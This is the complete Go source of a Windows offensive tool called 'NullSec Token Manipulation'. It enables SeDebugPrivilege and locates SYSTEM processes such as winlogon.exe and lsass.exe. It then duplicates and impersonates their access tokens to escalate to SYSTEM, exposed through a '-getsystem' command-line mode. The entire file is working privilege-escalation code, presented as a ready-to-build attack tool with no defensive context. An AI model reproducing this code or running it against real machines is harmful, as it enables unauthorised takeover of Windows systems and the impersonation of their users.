// NullSec Windows Token Manipulation
// Token stealing and privilege escalation
// Build: GOOS=windows go build -o nullsec-token.exe token.go
package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

var (
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	
	procOpenProcessToken     = advapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
	procDuplicateTokenEx     = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procGetTokenInformation  = advapi32.NewProc("GetTokenInformation")
	procOpenProcess          = kernel32.NewProc("OpenProcess")
)

const (
	TOKEN_ALL_ACCESS      = 0xF01FF
	TOKEN_DUPLICATE       = 0x0002
	TOKEN_IMPERSONATE     = 0x0004
	TOKEN_QUERY           = 0x0008
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	PROCESS_QUERY_INFORMATION = 0x0400
	SE_PRIVILEGE_ENABLED  = 0x00000002
)

func banner() {
	fmt.Println(`
╔═══════════════════════════════════════╗
║   NullSec Token Manipulation - Win    ║
║   Privilege escalation via tokens     ║
╚═══════════════════════════════════════╝`)
}

func listProcesses() {
	fmt.Println("\n[*] Running processes:")
	out, _ := exec.Command("tasklist", "/V", "/FO", "CSV").Output()
	lines := strings.Split(string(out), "\n")
	
	fmt.Printf("%-30s %-8s %-20s\n", "NAME", "PID", "USER")
	fmt.Println(strings.Repeat("-", 60))
	
	for i, line := range lines {
		if i == 0 || line == "" {
			continue
		}
		
		parts := strings.Split(line, ",")
		if len(parts) >= 7 {
			name := strings.Trim(parts[0], "\"")
			pid := strings.Trim(parts[1], "\"")
			user := strings.Trim(parts[6], "\"")
			
			if len(name) > 28 {
				name = name[:28] + ".."
			}
			if len(user) > 18 {
				user = user[:18] + ".."
			}
			
			fmt.Printf("%-30s %-8s %-20s\n", name, pid, user)
		}
	}
}

func listPrivileges() {
	fmt.Println("\n[*] Current token privileges:")
	out, _ := exec.Command("whoami", "/priv").Output()
	fmt.Println(string(out))
}

func enablePrivilege(name string) error {
	var token syscall.Token
	
	proc, _ := syscall.GetCurrentProcess()
	err := syscall.OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()
	
	var luid syscall.LUID
	namePtr, _ := syscall.UTF16PtrFromString(name)
	
	ret, _, err := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&luid)),
	)
	
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}
	
	type tokenPrivileges struct {
		PrivilegeCount uint32
		Privileges     [1]struct {
			Luid       syscall.LUID
			Attributes uint32
		}
	}
	
	tp := tokenPrivileges{PrivilegeCount: 1}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	
	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}
	
	fmt.Printf("[✓] Enabled privilege: %s\n", name)
	return nil
}

func stealToken(pid int) error {
	fmt.Printf("[*] Attempting to steal token from PID %d...\n", pid)
	
	// Open target process
	handle, _, err := procOpenProcess.Call(
		PROCESS_QUERY_INFORMATION,
		0,
		uintptr(pid),
	)
	
	if handle == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}
	
	// Open process token
	var token syscall.Token
	ret, _, err := procOpenProcessToken.Call(
		handle,
		TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,
		uintptr(unsafe.Pointer(&token)),
	)
	
	if ret == 0 {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	
	// Duplicate token
	var newToken syscall.Token
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(token),
		TOKEN_ALL_ACCESS,
		0,
		2, // SecurityImpersonation
		1, // TokenPrimary
		uintptr(unsafe.Pointer(&newToken)),
	)
	
	if ret == 0 {
		return fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}
	
	// Impersonate
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(newToken))
	
	if ret == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}
	
	fmt.Println("[✓] Token stolen and impersonated!")
	
	// Verify
	out, _ := exec.Command("whoami").Output()
	fmt.Printf("[*] Now running as: %s", string(out))
	
	return nil
}

func findSystemProcess() int {
	// Find a SYSTEM process to steal token from
	out, _ := exec.Command("tasklist", "/V", "/FO", "CSV").Output()
	lines := strings.Split(string(out), "\n")
	
	systemProcs := []string{"winlogon.exe", "lsass.exe", "services.exe", "csrss.exe"}
	
	for _, line := range lines {
		parts := strings.Split(line, ",")
		if len(parts) >= 7 {
			name := strings.ToLower(strings.Trim(parts[0], "\""))
			pid := strings.Trim(parts[1], "\"")
			user := strings.ToLower(strings.Trim(parts[6], "\""))
			
			for _, proc := range systemProcs {
				if name == proc && strings.Contains(user, "system") {
					p, _ := strconv.Atoi(pid)
					return p
				}
			}
		}
	}
	return 0
}

func main() {
	banner()
	
	list := flag.Bool("list", false, "List processes with users")
	priv := flag.Bool("priv", false, "List current privileges")
	enable := flag.String("enable", "", "Enable a privilege (e.g., SeDebugPrivilege)")
	steal := flag.Int("steal", 0, "Steal token from PID")
	getsystem := flag.Bool("getsystem", false, "Attempt to get SYSTEM via token theft")
	flag.Parse()
	
	if *list {
		listProcesses()
		return
	}
	
	if *priv {
		listPrivileges()
		return
	}
	
	if *enable != "" {
		if err := enablePrivilege(*enable); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
		return
	}
	
	if *steal != 0 {
		if err := stealToken(*steal); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
		return
	}
	
	if *getsystem {
		// Enable SeDebugPrivilege first
		enablePrivilege("SeDebugPrivilege")
		
		// Find SYSTEM process
		pid := findSystemProcess()
		if pid == 0 {
			fmt.Println("[!] Could not find SYSTEM process")
			return
		}
		
		fmt.Printf("[*] Found SYSTEM process: PID %d\n", pid)
		if err := stealToken(pid); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
		return
	}
	
	fmt.Println("[!] Usage:")
	fmt.Println("    nullsec-token -list          # List processes")
	fmt.Println("    nullsec-token -priv          # Show privileges")
	fmt.Println("    nullsec-token -enable <priv> # Enable privilege")
	fmt.Println("    nullsec-token -steal <PID>   # Steal token")
	fmt.Println("    nullsec-token -getsystem     # Get SYSTEM token")
	flag.PrintDefaults()
}
